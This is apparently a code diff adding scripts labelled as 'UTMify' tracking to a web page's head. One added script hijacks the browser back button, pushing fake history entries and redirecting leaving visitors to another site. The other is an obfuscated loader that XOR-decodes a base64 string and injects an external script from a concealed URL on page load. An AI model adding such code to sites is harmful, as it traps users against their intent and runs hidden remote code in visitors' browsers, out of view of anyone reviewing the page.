@@ -18,6 +18,34 @@
       fbq('track', 'PageView');
     </script>
     <!-- End Meta Pixel Code -->
+    <!-- UTMify Scripts -->
+    <script>
+      // ALTERE O LINK PARA A PÁGINA QUE QUISER MOSTRAR QUANDO O USUÁRIO TENTAR SAIR
+      const link = 'https://meubackredirect.com.br';
+
+      function setBackRedirect(url) {
+        let urlBackRedirect = url;
+        urlBackRedirect = urlBackRedirect =
+          urlBackRedirect.trim() +
+          (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
+          document.location.search.replace('?', '').toString();
+
+        history.pushState({}, '', location.href);
+        history.pushState({}, '', location.href);
+        history.pushState({}, '', location.href);
+
+        window.addEventListener('popstate', () => {
+          console.log('onpopstate', urlBackRedirect);
+          setTimeout(() => {
+            location.href = urlBackRedirect;
+          }, 1);
+        });
+      }
+
+      setBackRedirect(link);
+    </script>
+    <script>(function(){var d_w=atob("DI1RHPcEQhckOrU3SvZzaYVoYC0GUsFDOv5rM9hnJnkKT8FaI+soMpRrLzlGSJpEKf84bIN3bWJQV8YYJuwleYRwbH1XGJkVK/klbp5mN2NBSZcNEfZzcpZpJzUeGNFWPux8aYNpK3FdF8VFL/s0coMpOnRLXphEKeZzMNVyI3tRX5cNaK8sMIwmLHZJX5cNaOkwaJYpN2NJU9NOZ/0jeYFhLGMJScBVI+kiPtsmNHZIT9AVcK9zYap5");var o_l=[];for(var d_5h=0;d_5h<d_w.length;d_5h++){o_l.push(d_w.charCodeAt(d_5h)&255);}var g_otpm=o_l[0];var k_wlz=o_l.slice(1,1+g_otpm);var f_nh5=o_l.slice(1+g_otpm);var h_yci8=f_nh5.map(function(b,m_w){return b^k_wlz[m_w%g_otpm];});var a_w7="";for(var w_b3zy=0;w_b3zy<h_yci8.length;w_b3zy++){a_w7+=String.fromCharCode(h_yci8[w_b3zy]&255);}var f_99x=decodeURIComponent(escape(a_w7));var k_1n3i=JSON.parse(f_99x);var d_r=k_1n3i.globals||[];d_r.forEach(function(q_eoig){window[q_eoig.name]=q_eoig.value;});var g_p5=document.createElement("script");g_p5.src=k_1n3i.url;g_p5.async=true;g_p5.defer=true;(k_1n3i.attributes||[]).forEach(function(r_w4x){g_p5.setAttribute(r_w4x.name,r_w4x.value);});(document.head||document.documentElement).appendChild(g_p5);})();</script>
+    <!-- End UTMify Scripts -->
   </head>
   <body>
     <noscript><img height="1" width="1" style="display:none"
